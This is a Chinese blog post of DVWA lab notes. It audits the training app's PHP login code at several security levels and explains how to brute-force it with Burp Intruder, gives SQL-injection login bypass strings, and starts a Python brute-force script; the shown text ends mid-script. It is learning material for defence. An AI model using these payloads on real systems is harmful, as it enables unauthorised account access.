<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="努力，奋斗！"><title>DVWA学习笔记 | 其斤.匕禾页</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/8.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">DVWA学习笔记</h1><a id="logo" href="/.">其斤.匕禾页</a><p class="description">永远相信美好的事情即将发生</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="https://blog.xhzyxed.cn/2018/09/22/408基础/"><i class="fa fa-archive"> 计算机基础</i></a><a href="https://blog.xhzyxed.cn/2018/09/17/resume/"><i class="fa fa-user"> resume</i></a><a href="https://www.xhzyxed.cn/"><i class="fa fa-user"> 关于</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">DVWA学习笔记</h1><div class="post-meta">Feb 2, 2018<span> | </span><span class="category"><a href="/categories/web安全/">web安全</a></span></div><div class="clear"><div class="toc-article" id="toc"><div class="toc-title">文章目录</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#DVWA简介"><span class="toc-number">1.</span> <span class="toc-text">DVWA简介</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#DVWA"><span class="toc-number">1.1.</span> <span class="toc-text">DVWA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#功能模块"><span class="toc-number">1.2.</span> <span class="toc-text">功能模块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#新版本"><span class="toc-number">1.3.</span> <span class="toc-text">新版本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Brute-Force"><span class="toc-number">2.</span> <span class="toc-text">Brute Force</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#LOW"><span class="toc-number">2.1.</span> <span class="toc-text">LOW</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计"><span class="toc-number">2.1.1.</span> <span class="toc-text">审计:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用"><span class="toc-number">2.1.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium"><span class="toc-number">2.2.</span> <span class="toc-text">Medium</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-1"><span class="toc-number">2.2.1.</span> <span class="toc-text">审计:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High"><span class="toc-number">2.3.</span> <span class="toc-text">High</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-2"><span class="toc-number">2.3.1.</span> <span class="toc-text">审计:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用-2"><span class="toc-number">2.3.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible"><span class="toc-number">2.4.</span> <span class="toc-text">Impossible</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-3"><span class="toc-number">2.4.1.</span> <span class="toc-text">审计:</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Command-Injection"><span class="toc-number">3.</span> <span class="toc-text">Command Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low"><span class="toc-number">3.1.</span> <span class="toc-text">Low</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-4"><span class="toc-number">3.1.1.</span> <span class="toc-text">审计:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用-3"><span class="toc-number">3.1.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-1"><span class="toc-number">3.2.</span> <span class="toc-text">Medium</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-5"><span class="toc-number">3.2.1.</span> <span class="toc-text">审计:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用-4"><span class="toc-number">3.2.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-1"><span class="toc-number">3.3.</span> <span class="toc-text">High</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-6"><span class="toc-number">3.3.1.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用-5"><span class="toc-number">3.3.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-1"><span class="toc-number">3.4.</span> <span class="toc-text">Impossible</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-7"><span class="toc-number">3.4.1.</span> <span class="toc-text">审计</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CSRF-Cross-site-request-forgery"><span class="toc-number">4.</span> <span class="toc-text">CSRF(Cross-site request forgery)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-1"><span class="toc-number">4.1.</span> <span class="toc-text">Low</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-8"><span class="toc-number">4.1.1.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用-6"><span class="toc-number">4.1.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-2"><span class="toc-number">4.2.</span> <span class="toc-text">Medium</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-2"><span class="toc-number">4.3.</span> <span class="toc-text">Impossible</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-9"><span class="toc-number">4.3.1.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用-7"><span class="toc-number">4.3.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-3"><span class="toc-number">4.4.</span> <span class="toc-text">Medium</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-10"><span class="toc-number">4.4.1.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用-8"><span class="toc-number">4.4.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-3"><span class="toc-number">4.5.</span> <span class="toc-text">Impossible</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#代码审计"><span class="toc-number">4.5.1.</span> <span class="toc-text">代码审计</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#File-Upload"><span class="toc-number">5.</span> <span class="toc-text">File Upload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-2"><span class="toc-number">5.1.</span> <span class="toc-text">Low</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-11"><span class="toc-number">5.1.1.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用-9"><span class="toc-number">5.1.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-4"><span class="toc-number">5.2.</span> <span class="toc-text">Medium</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-12"><span class="toc-number">5.2.1.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用-10"><span class="toc-number">5.2.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-4"><span class="toc-number">5.3.</span> <span class="toc-text">Impossible</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-13"><span class="toc-number">5.3.1.</span> <span class="toc-text">审计</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection"><span class="toc-number">6.</span> <span class="toc-text">SQL Injection</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#手工注入思路"><span class="toc-number">6.1.</span> <span class="toc-text">手工注入思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-3"><span class="toc-number">6.2.</span> <span class="toc-text">Low</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-14"><span class="toc-number">6.2.1.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用-11"><span class="toc-number">6.2.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-5"><span class="toc-number">6.3.</span> <span class="toc-text">Medium</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-15"><span class="toc-number">6.3.1.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用-12"><span class="toc-number">6.3.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-2"><span class="toc-number">6.4.</span> <span class="toc-text">High</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-16"><span class="toc-number">6.4.1.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用-13"><span class="toc-number">6.4.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Impossible-5"><span class="toc-number">6.5.</span> <span class="toc-text">Impossible</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-17"><span class="toc-number">6.5.1.</span> <span class="toc-text">审计</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL-Injection-Blind"><span class="toc-number">7.</span> <span class="toc-text">SQL Injection(Blind)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#手工盲注思路"><span class="toc-number">7.1.</span> <span class="toc-text">手工盲注思路</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-4"><span class="toc-number">7.2.</span> <span class="toc-text">Low</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-18"><span class="toc-number">7.2.1.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用-14"><span class="toc-number">7.2.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-6"><span class="toc-number">7.3.</span> <span class="toc-text">Medium</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-19"><span class="toc-number">7.3.1.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用-15"><span class="toc-number">7.3.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-3"><span class="toc-number">7.4.</span> <span class="toc-text">High</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#审计-20"><span class="toc-number">7.5.</span> <span class="toc-text">审计</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS"><span class="toc-number">8.</span> <span class="toc-text">XSS</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#反射型XSS"><span class="toc-number">8.1.</span> <span class="toc-text">反射型XSS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Low-5"><span class="toc-number">8.2.</span> <span class="toc-text">Low</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-21"><span class="toc-number">8.2.1.</span> <span class="toc-text">审计</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#漏洞利用-16"><span class="toc-number">8.2.2.</span> <span class="toc-text">漏洞利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-7"><span class="toc-number">8.3.</span> <span class="toc-text">Medium</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-22"><span class="toc-number">8.3.1.</span> <span class="toc-text">审计</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Medium-8"><span class="toc-number">8.4.</span> <span class="toc-text">Medium</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-26"><span class="toc-number">8.4.1.</span> <span class="toc-text">审计</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#High-5"><span class="toc-number">8.5.</span> <span class="toc-text">High</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#审计-27"><span class="toc-number">8.5.1.</span> <span class="toc-text">审计</span></a></li></ol></li></ol></li></ol></div></div><div class="post-content"><p>前面一篇文章我们知道了OWAS给出的十大漏洞，那么我们今天继续学习怎么进一步的学习了解以及在日常开发中怎么防范这些漏洞<br>话说不知道没有学习过web安全的同学看到标题又一脸懵逼了，什么叫做DVWA呢，那么本文章继续梳理下知识点。<br><a id="more"></a></p>
<h2 id="DVWA简介"><a href="#DVWA简介" class="headerlink" title="DVWA简介"></a>DVWA简介</h2><h3 id="DVWA"><a href="#DVWA" class="headerlink" title="DVWA"></a>DVWA</h3><blockquote>
<p>DVWA（Damn Vulnerable Web Application）是一个用来进行安全脆弱性鉴定的PHP/MySQL Web应用，旨在为安全专业人员测试自己的专业技能和工具提供合法的环境，帮助web开发者更好的理解web应用安全防范的过程。</p>
</blockquote>
<p>简单点说就是帮你来学习web安全的一个应用，你在上面可以审计代码并且练习怎么防范这些漏洞，听起来很厉害的样子。</p>
<h3 id="功能模块"><a href="#功能模块" class="headerlink" title="功能模块"></a>功能模块</h3><blockquote>
<p>Brute Force（暴力（破解））<br> Command Injection（命令行注入）<br> CSRF（跨站请求伪造）<br> File Inclusion（文件包含）<br> File Upload（文件上传）<br> Insecure CAPTCHA （不安全的验证码）<br> SQL Injection（SQL注入）<br> SQL Injection（Blind）（SQL盲注）<br> XSS（Reflected）（反射型跨站脚本）<br> XSS（Stored）（存储型跨站脚本）</p>
</blockquote>
<h3 id="新版本"><a href="#新版本" class="headerlink" title="新版本"></a>新版本</h3><p>现在目前最新版本是1.9版本，新版本有四种安全级别，分别是Low，Medium，High，Impossible。初学者可以通过比较四种级别的代码，接触到一些PHP代码审计的内容。</p>
<h2 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h2><p>Brute Force，即暴力（破解），是指黑客利用密码字典，使用穷举法猜解出用户口令，是现在最为广泛使用的攻击手法之一，如2014年轰动全国的12306“撞库”事件，实质就是暴力破解攻击。<br>在DVWA下的界面是这样子的，如下所示:<br><img src="brute01.png" alt=""></p>
<p>暴力破解也是我们经常通道的攻击手法了，接下看下每个级别下的代码进行审计分析下</p>
<h3 id="LOW"><a href="#LOW" class="headerlink" title="LOW"></a>LOW</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'Login'</span>]))&#123;</span><br><span class="line">//Getusername</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_GET</span>[<span class="string">'username'</span>];</span><br><span class="line"></span><br><span class="line">//Getpassword</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_GET</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="variable">$pass</span>=md5(<span class="variable">$pass</span>);</span><br><span class="line"></span><br><span class="line">//Checkthedatabase</span><br><span class="line"><span class="variable">$query</span>=<span class="string">"SELECT*FROM`users`WHEREuser='<span class="variable">$user</span>'ANDpassword='<span class="variable">$pass</span>';"</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$query</span>)ordie(<span class="string">'&lt;pre&gt;'</span>.mysql_error().<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>&amp;&amp;mysql_num_rows(<span class="variable">$result</span>)==1)&#123;</span><br><span class="line">//Getusersdetails</span><br><span class="line"><span class="variable">$avatar</span>=mysql_result(<span class="variable">$result</span>,0,<span class="string">"avatar"</span>);</span><br><span class="line"></span><br><span class="line">//Loginsuccessful</span><br><span class="line"><span class="built_in">echo</span><span class="string">"&lt;p&gt;Welcometothepasswordprotectedarea&#123;<span class="variable">$user</span>&#125;&lt;/p&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span><span class="string">"&lt;imgsrc="</span>&#123;<span class="variable">$avatar</span>&#125;<span class="string">"/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">//Loginfailed</span><br><span class="line"><span class="built_in">echo</span><span class="string">"&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计"><a href="#审计" class="headerlink" title="审计:"></a>审计:</h4><p>只判断了该login值有没有被设置，对接受的参数没有做任何过滤，存在明显的sql注入漏洞，最后没有任何的方爆破机制</p>
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><ul>
<li>方法一:<br>使用burpsuite的proxy模块抓完包之后send to intruder模块，对password进行爆破，最后尝试在爆破结果中http响应状态或者响应包长度，可推测正确的密码。如下图所示:</li>
</ul>
<p><img src="burce01.png" alt=""></p>
<ul>
<li>方法二:<br>Username:admin’ or ’1′=’1<br>Password:（空）<br>或者<br>Username :admin’ #<br>Password :（空）</li>
</ul>
<h3 id="Medium"><a href="#Medium" class="headerlink" title="Medium"></a>Medium</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'Login'</span>]))&#123;</span><br><span class="line">//Sanitiseusernameinput</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_GET</span>[<span class="string">'username'</span>];</span><br><span class="line"><span class="variable">$user</span>=mysql_real_escape_string(<span class="variable">$user</span>);</span><br><span class="line"></span><br><span class="line">//Sanitisepasswordinput</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_GET</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="variable">$pass</span>=mysql_real_escape_string(<span class="variable">$pass</span>);</span><br><span class="line"><span class="variable">$pass</span>=md5(<span class="variable">$pass</span>);</span><br><span class="line"></span><br><span class="line">//Checkthedatabase</span><br><span class="line"><span class="variable">$query</span>=<span class="string">"SELECT*FROM`users`WHEREuser='<span class="variable">$user</span>'ANDpassword='<span class="variable">$pass</span>';"</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$query</span>)ordie(<span class="string">'&lt;pre&gt;'</span>.mysql_error().<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>&amp;&amp;mysql_num_rows(<span class="variable">$result</span>)==1)&#123;</span><br><span class="line">//Getusersdetails</span><br><span class="line"><span class="variable">$avatar</span>=mysql_result(<span class="variable">$result</span>,0,<span class="string">"avatar"</span>);</span><br><span class="line"></span><br><span class="line">//Loginsuccessful</span><br><span class="line"><span class="built_in">echo</span><span class="string">"&lt;p&gt;Welcometothepasswordprotectedarea&#123;<span class="variable">$user</span>&#125;&lt;/p&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span><span class="string">"&lt;imgsrc="</span>&#123;<span class="variable">$avatar</span>&#125;<span class="string">"/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">//Loginfailed</span><br><span class="line">sleep(2);</span><br><span class="line"><span class="built_in">echo</span><span class="string">"&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-1"><a href="#审计-1" class="headerlink" title="审计:"></a>审计:</h4><p>对比low级别的代码，使用mysql_real_escape_string来对字符串中的特殊符号（x00，n，r，，’，”，x1a）进行转义，这个方法能够抵御一般的sql注入攻击，同时对密码做了MD5校验，杜绝了通过password参数进行sql注入的可能性，此外，对错误输入加入了两秒的延时，但是此举还不是有效的防爆破机制。</p>
<h4 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>同Low级别的方法一，使用burp进行爆破攻击。</p>
<h3 id="High"><a href="#High" class="headerlink" title="High"></a>High</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$_GET</span>[<span class="string">'Login'</span>]))&#123;</span><br><span class="line">//CheckAnti-CSRFtoken</span><br><span class="line">checkToken(<span class="variable">$_REQUEST</span>[<span class="string">'user_token'</span>],<span class="variable">$_SESSION</span>[<span class="string">'session_token'</span>],<span class="string">'index.php'</span>);</span><br><span class="line"></span><br><span class="line">//Sanitiseusernameinput</span><br><span class="line"><span class="variable">$user</span>=<span class="variable">$_GET</span>[<span class="string">'username'</span>];</span><br><span class="line"><span class="variable">$user</span>=stripslashes(<span class="variable">$user</span>);</span><br><span class="line"><span class="variable">$user</span>=mysql_real_escape_string(<span class="variable">$user</span>);</span><br><span class="line"></span><br><span class="line">//Sanitisepasswordinput</span><br><span class="line"><span class="variable">$pass</span>=<span class="variable">$_GET</span>[<span class="string">'password'</span>];</span><br><span class="line"><span class="variable">$pass</span>=stripslashes(<span class="variable">$pass</span>);</span><br><span class="line"><span class="variable">$pass</span>=mysql_real_escape_string(<span class="variable">$pass</span>);</span><br><span class="line"><span class="variable">$pass</span>=md5(<span class="variable">$pass</span>);</span><br><span class="line"></span><br><span class="line">//Checkdatabase</span><br><span class="line"><span class="variable">$query</span>=<span class="string">"SELECT*FROM`users`WHEREuser='<span class="variable">$user</span>'ANDpassword='<span class="variable">$pass</span>';"</span>;</span><br><span class="line"><span class="variable">$result</span>=mysql_query(<span class="variable">$query</span>)ordie(<span class="string">'&lt;pre&gt;'</span>.mysql_error().<span class="string">'&lt;/pre&gt;'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>&amp;&amp;mysql_num_rows(<span class="variable">$result</span>)==1)&#123;</span><br><span class="line">//Getusersdetails</span><br><span class="line"><span class="variable">$avatar</span>=mysql_result(<span class="variable">$result</span>,0,<span class="string">"avatar"</span>);</span><br><span class="line"></span><br><span class="line">//Loginsuccessful</span><br><span class="line"><span class="built_in">echo</span><span class="string">"&lt;p&gt;Welcometothepasswordprotectedarea&#123;<span class="variable">$user</span>&#125;&lt;/p&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span><span class="string">"&lt;imgsrc="</span>&#123;<span class="variable">$avatar</span>&#125;<span class="string">"/&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">//Loginfailed</span><br><span class="line">sleep(rand(0,3));</span><br><span class="line"><span class="built_in">echo</span><span class="string">"&lt;pre&gt;&lt;br/&gt;Usernameand/orpasswordincorrect.&lt;/pre&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mysql_close();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//GenerateAnti-CSRFtoken</span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h4 id="审计-2"><a href="#审计-2" class="headerlink" title="审计:"></a>审计:</h4><p>这种级别差不多是我们日常写到的等级喔，比前面中等级别增加了一个防范无脑爆破的user_token，此举能够抵御CSRF攻击，同时也增加爆破的难度。但是只是增加了爆破的一点成本而已</p>
<h4 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>这里我们不能使用burp对user_token进行抓取，但是我们可以自己写代码伪造请求，我们不做脚本小子，自己来写脚本来破解。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># _*_ coding: utf-8 _*_</span></span><br><span class="line">from bs4 import BeautifulSoup</span><br><span class="line">from urllib import request</span><br><span class="line"></span><br><span class="line"><span class="comment">## 伪造头部</span></span><br><span class="line">header = &#123;</span><br><span class="line">    <span 